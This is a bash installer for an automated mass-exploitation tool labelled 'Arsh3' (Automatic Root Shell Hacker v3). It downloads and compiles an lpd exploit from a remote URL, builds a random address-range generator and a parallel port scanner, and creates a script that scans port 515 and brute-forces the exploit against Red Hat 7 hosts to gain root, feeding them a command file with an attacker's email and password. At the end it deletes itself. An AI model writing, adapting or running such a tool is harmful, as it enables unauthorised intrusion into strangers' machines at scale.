#!/bin/bash

echo ""
echo "[ElectronicSouls] Arsh3 installer";
echo ""

lynx -dump http://www.securityfocus.com/data/vulnerabilities/exploits/SEClpd.c>seclpd.c;

if [ -e seclpd.c ]
 then
  echo [*] seclpd.c downloaded
 else
  echo [ ] seclpd counld not be downloaded...exiting;exit 1
fi

gcc seclpd.c -o seclpd
rm -f seclpd.c;

if [ -e seclpd ]
 then
  echo [*] seclpd compiled
 else
  echo [ ] seclpd counld not be compiled...exiting;exit 1
fi

cat >randb.c <<EOF
#include <stdio.h>
#include <stdlib.h>

int main() {
int a=0,b=0;
srand(time(NULL));
start:;
a=1+(int) (223.0*rand()/(RAND_MAX+1.0));
b=1+(int) (255.0*rand()/(RAND_MAX+1.0));
if (a == 127) { goto start; }
if (a == 0) { goto start; }
if (a == 1) { goto start; }
if (a == 2) { goto start; }
if (a == 3) { goto start; }
if (a == 4) { goto start; }
if (a == 5) { goto start; }
if (a == 6) { goto start; }
if (a == 7) { goto start; }
if (a == 8) { goto start; }
if (a == 9) { goto start; }
if (a == 10) { goto start; }
if (a == 49) { goto start; }
if (a == 192) { if (b == 168) { goto start; } }
printf("%i.%i", a, b);
}
EOF


if [ ! -e randb.c ]
 then
  echo [ ] Cannot create. Exiting.;exit 1
 else
  echo [*] randb.c created
fi

gcc randb.c -o randb
rm -f randb.c

if [ ! -e randb ]
 then
  echo [ ] Cannot compile. Exiting.;exit 1
 else
  echo [*] randb.c compiled
fi


cat > pscan.c <<EOF
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define MAX_SOCKETS 200
#define TIMEOUT 3

#define S_NONE       0
#define S_CONNECTING 1

struct conn_t {
  int s;
  char status;
  time_t a;
  struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void check_sockets(void);
void cheq_ftp(char *);
void fatal(char *);

int main(int argc, char *argv[])
{
  int done, i, cip, bb, ret, k, ns;
  time_t scantime;
  char ip[20];

  if (argc < 3) {
     printf("Usage: %s <b-block> <port> [c-block]\n", argv[0]);
     return -1;
  }

  done = 0; cip = 1; bb = 0;

  if (argc >= 4) {
     bb = atoi(argv[3]);
     if ((bb < 0) || (bb > 255))
        fatal("Invalid b-range.\n");
  }

  init_sockets();

  scantime = time(0);

  while(!done) {
    for (i = 0; i < MAX_SOCKETS; i++) {
        if (cip == 255) {           
           if ((bb == 255) || (argc >= 4)) {
              ns = 0;
              for (k = 0; k < MAX_SOCKETS; k++) {               
                  if (connlist[k].status > S_NONE) {
                     ns++;
                     break;
                  }
              }

              if (ns == 0)
                 done = 1;

              break;
           }
           else {
             cip = 0;
             bb++;
           }
        }

        if (connlist[i].status == S_NONE) {
           connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
           if (connlist[i].s == -1)
              printf("Unable to allocate socket.\n");
           else {
             ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
             if (ret == -1) {
                printf("Unable to set O_NONBLOCK\n");
                close(connlist[i].s);
             }
             else {
               memset((char *)ip, 0, 20);
               sprintf(ip, "%s.%d.%d", argv[1], bb, cip);
               connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
               if (connlist[i].addr.sin_addr.s_addr == -1)
                 fatal("Invalid IP.");
               connlist[i].addr.sin_family = AF_INET;
               connlist[i].addr.sin_port = htons(atoi(argv[2]));
               connlist[i].a = time(0);
               connlist[i].status = S_CONNECTING;
               cip++;
             }
           }
        }
    }

    check_sockets();
  }

  printf("\nScan completed in %u seconds.\n", (time(0) - scantime));
}

void init_sockets(void)
{
  int i;

  for (i = 0; i < MAX_SOCKETS; i++) {
      connlist[i].status = S_NONE;
      memset((struct sockaddr_in *)&connlist[i].addr, 0, 
             sizeof(struct sockaddr_in));
  }
}

void check_sockets(void)
{
  int i, ret;

  for (i = 0; i < MAX_SOCKETS; i++) {
      if ((connlist[i].a < (time(0) - TIMEOUT)) &&
          (connlist[i].status == S_CONNECTING)) {
         close(connlist[i].s);
         connlist[i].status = S_NONE;
      }

      else if (connlist[i].status == S_CONNECTING) {
         ret = connect(connlist[i].s,
                       (struct sockaddr *)&connlist[i].addr,
                       sizeof(struct sockaddr_in));
         if (ret == -1) {
            if (errno == EISCONN) {
               printf("%s\n",
                      (char *)inet_ntoa(connlist[i].addr.sin_addr));
               cheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));
	       close(connlist[i].s);
               connlist[i].status = S_NONE;
            }

            if ((errno != EALREADY) && (errno != EINPROGRESS)) {
               close(connlist[i].s);
               connlist[i].status = S_NONE;
            }
         }
         else {
           printf("%s\n",
                  (char *)inet_ntoa(connlist[i].addr.sin_addr));
	cheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));
           close(connlist[i].s);
           connlist[i].status = S_NONE;
         }
      }
  }
}

void fatal(char *err)
{
  int i;
  printf("Error: %s\n", err);
  for (i = 0; i < MAX_SOCKETS; i++) {
      if (connlist[i].status >= S_CONNECTING)
         close(connlist[i].s);
  }
  exit(-1);
}

void cheq_ftp(char *h) {
	char hay[1024];
	snprintf(hay,sizeof(hay),"echo %s>>log",h);
	system(hay);
}
EOF

if [ ! -e pscan.c ]
 then
  echo "[ ] Cannot create. Exiting.";exit 1
 else
  echo [*] pscan.c created
fi

gcc pscan.c -o pscan
rm -f pscan.c

if [ ! -e pscan ]
 then
  echo "[ ] Cannot compile. Exiting.";exit 1
 else
  echo [*] pscan.c compiled
fi

cat >arsh3 <<EOF
#!/bin/bash
clear
echo "[ElectronicSouls]"
echo "Automatic Root Shell Hacker v3"
echo ""

if [ "\$1" = "" ]
 then echo "\$0 <B-class> [C-class]"
  exit 1
fi

rm -f perf
echo "Scanning for lpd"
./pscan \$1 515 \$2

echo "Scan for lpd ready, filtering out the rh7 boxes"
cat log | while read line
 do
  echo ./chk $line>>perf;
 done

sh perf
rm -f perf

echo "Ready...trying to own the boxes"
cat rh7 | while read line
 do
  echo "./seclpd $line brute -t 0 <cmd">>perf
 done

sh perf
EOF

if [ ! -e arsh3 ]
 then
  echo "[ ] Cannot create arsh3. Exiting.";exit 1
 else
  echo [*] arsh3 created
  chmod +x arsh3
fi

if [ -e chk ]
then
 echo "[*] chk"
 chmod +x chk
else
 echo "[ ] chk mising! You need to paste the file chk and chmod +x it!"
fi

if [ ! -e cmd ]
then
 echo "[ ] cmd missing! You need to create it and change the password/email!"
else
 echo "[*] cmd ok"
 echo "    Edit cmd and change line 9 (mail) and line 25 (password)!"
fi

if [ -e rscan ]
then
 echo "[*] rscan"
 chmod +x rscan
else
 echo "[ ] rscan missing! You need to paste the file rscan and chmod +x it if you want random scans!"
fi

echo ""

echo ""
rm -f $0

